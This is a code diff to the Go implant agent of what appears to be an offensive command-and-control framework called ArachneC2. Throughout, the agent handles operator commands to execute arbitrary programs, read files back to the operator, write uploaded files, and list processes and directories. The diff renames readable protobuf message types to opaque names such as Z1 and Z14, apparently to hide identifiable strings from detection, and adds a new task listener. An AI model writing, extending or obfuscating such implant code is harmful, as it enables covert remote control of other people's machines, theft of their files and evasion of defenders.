@@ -21,7 +21,7 @@ import (
 
 	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
 	"github.com/portbuster1337/ArachneC2/pkg/transport"
-	arachnepb "github.com/portbuster1337/ArachneC2/protobuf/arachnepb"
+	apb "github.com/portbuster1337/ArachneC2/protobuf/apb"
 )
 
 type Agent struct {
@@ -162,6 +162,9 @@ func (a *Agent) Start() error {
 	if err := a.messenger.ListenCommands(a.ctx); err != nil {
 		return fmt.Errorf("listen commands: %w", err)
 	}
+	if err := a.messenger.ListenTask(a.ctx, a.node.ID().String()); err != nil {
+		return fmt.Errorf("listen task: %w", err)
+	}
 
 	ns := a.messenger.RendezvousString()
 	if a.node.DHT != nil {
@@ -275,7 +278,7 @@ func (a *Agent) sendBeaconRegister() {
 	} else if err == nil && u.Username != "" {
 		username = u.Username
 	}
-	reg := &arachnepb.Register{
+	reg := &apb.Register{
 		Name:     username,
 		Hostname: hostname,
 		Username: username,
@@ -291,7 +294,7 @@ func (a *Agent) sendBeaconRegister() {
 		ActiveC2: a.node.ID().String(),
 	}
 
-	beaconReg := &arachnepb.BeaconRegister{
+	beaconReg := &apb.Z1{
 		ID:       a.node.ID().String(),
 		Interval: int64(a.config.BeaconInterval.Seconds()),
 		Jitter:   int64(a.config.BeaconJitter.Seconds()),
@@ -311,7 +314,7 @@ func (a *Agent) sendBeaconRegister() {
 	}
 }
 
-func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, senderPub crypto.PubKey) {
+func (a *Agent) handleCommand(ctx context.Context, env *apb.Envelope, senderPub crypto.PubKey) {
 	if err := transport.VerifyEnvelope(env, a.operatorPub); err != nil {
 		log.Printf("[implant] dropped command — %v", err)
 		return
@@ -353,26 +356,26 @@ func (a *Agent) sendResult(resultType uint32, data []byte) {
 	}
 }
 
-func (a *Agent) handlePs(env *arachnepb.Envelope) {
-	result := &arachnepb.Ps{}
+func (a *Agent) handlePs(env *apb.Envelope) {
+	result := &apb.Z13{}
 	result.Processes = listProcesses()
 	data, _ := proto.Marshal(result)
 	log.Printf("[implant] ps result: %d processes", len(result.Processes))
 	a.sendResult(transport.MsgTypePs, data)
 }
 
-func (a *Agent) handlePing(env *arachnepb.Envelope) {
+func (a *Agent) handlePing(env *apb.Envelope) {
 	log.Printf("[implant] ping received")
 	a.sendResult(transport.MsgTypePing, nil)
 }
 
-func (a *Agent) handleDownload(env *arachnepb.Envelope) {
-	req := &arachnepb.DownloadReq{}
+func (a *Agent) handleDownload(env *apb.Envelope) {
+	req := &apb.Z22{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
 		return
 	}
 
-	result := &arachnepb.Download{Path: req.Path}
+	result := &apb.Z23{Path: req.Path}
 	data, err := os.ReadFile(req.Path)
 	if err != nil {
 		result.Exists = false
@@ -386,13 +389,13 @@ func (a *Agent) handleDownload(env *arachnepb.Envelope) {
 	a.sendResult(transport.MsgTypeDownload, respData)
 }
 
-func (a *Agent) handleUpload(env *arachnepb.Envelope) {
-	req := &arachnepb.UploadReq{}
+func (a *Agent) handleUpload(env *apb.Envelope) {
+	req := &apb.Z24{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
 		return
 	}
 
-	result := &arachnepb.Upload{Path: req.Path}
+	result := &apb.Z25{Path: req.Path}
 	perm := os.FileMode(0644)
 	if req.Overwrite {
 		if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
@@ -413,18 +416,18 @@ func (a *Agent) handleUpload(env *arachnepb.Envelope) {
 	a.sendResult(transport.MsgTypeUpload, respData)
 }
 
-func (a *Agent) handleScreenshot(env *arachnepb.Envelope) {
+func (a *Agent) handleScreenshot(env *apb.Envelope) {
 	log.Printf("[implant] screenshot requested (not implemented on this platform)")
 	a.sendResult(transport.MsgTypeScreenshot, nil)
 }
 
-func (a *Agent) handleCd(env *arachnepb.Envelope) {
-	req := &arachnepb.CdReq{}
+func (a *Agent) handleCd(env *apb.Envelope) {
+	req := &apb.Z19{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
 		return
 	}
 
-	result := &arachnepb.Pwd{}
+	result := &apb.Z21{}
 	if err := os.Chdir(req.Path); err != nil {
 		result.Path, _ = os.Getwd()
 	} else {
@@ -436,8 +439,8 @@ func (a *Agent) handleCd(env *arachnepb.Envelope) {
 	a.sendResult(transport.MsgTypePwd, data)
 }
 
-func (a *Agent) handlePwd(env *arachnepb.Envelope) {
-	result := &arachnepb.Pwd{}
+func (a *Agent) handlePwd(env *apb.Envelope) {
+	result := &apb.Z21{}
 	result.Path, _ = os.Getwd()
 
 	data, _ := proto.Marshal(result)
@@ -445,18 +448,18 @@ func (a *Agent) handlePwd(env *arachnepb.Envelope) {
 	a.sendResult(transport.MsgTypePwd, data)
 }
 
-func (a *Agent) handleKill(env *arachnepb.Envelope) {
+func (a *Agent) handleKill(env *apb.Envelope) {
 	log.Printf("[implant] kill received, shutting down")
 	os.Exit(0)
 }
 
-func (a *Agent) handleLs(env *arachnepb.Envelope) {
-	req := &arachnepb.LsReq{}
+func (a *Agent) handleLs(env *apb.Envelope) {
+	req := &apb.Z16{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
 		return
 	}
 
-	result := &arachnepb.Ls{Path: req.Path}
+	result := &apb.Z17{Path: req.Path}
 	entries, err := os.ReadDir(req.Path)
 	if err != nil {
 		result.Exists = false
@@ -464,7 +467,7 @@ func (a *Agent) handleLs(env *arachnepb.Envelope) {
 		result.Exists = true
 		for _, e := range entries {
 			info, _ := e.Info()
-			fi := &arachnepb.FileInfo{
+			fi := &apb.Z18{
 				Name:  e.Name(),
 				IsDir: e.IsDir(),
 			}
@@ -482,13 +485,13 @@ func (a *Agent) handleLs(env *arachnepb.Envelope) {
 	a.sendResult(transport.MsgTypeLs, data)
 }
 
-func (a *Agent) handleExecute(env *arachnepb.Envelope) {
-	req := &arachnepb.ExecuteReq{}
+func (a *Agent) handleExecute(env *apb.Envelope) {
+	req := &apb.Z14{}
 	if err := proto.Unmarshal(env.Data, req); err != nil {
 		return
 	}
 
-	result := &arachnepb.Execute{}
+	result := &apb.Z15{}
 	cmd := exec.CommandContext(a.ctx, req.Path, req.Args...)
 	if req.Output {
 		out, err := cmd.CombinedOutput()
